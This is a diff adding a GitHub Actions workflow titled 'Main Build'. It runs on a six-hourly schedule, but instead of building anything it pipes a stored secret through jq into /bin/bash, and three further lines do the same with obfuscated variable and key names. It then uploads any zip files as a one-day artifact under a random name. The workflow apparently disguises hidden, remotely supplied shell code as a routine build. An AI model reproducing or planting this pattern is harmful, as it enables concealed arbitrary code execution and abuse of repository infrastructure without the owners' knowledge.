@@ -1,0 +1,34 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 1,7,13,19 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          do557: ${{ secrets.do557 }}
+        run: |
+          printf '%s' "$do557" | jq -r .dhjo3317 | /bin/bash
+          printf '%s' "$skr4592" | jq -r .ocs477 | /bin/bash
+          printf '%s' "$q0678" | jq -r .cud8 | /bin/bash
+          printf '%s' "$oabt7586" | jq -r .uxkh9 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: GkirgBaI
+          path: "*.zip"
+          retention-days: 1
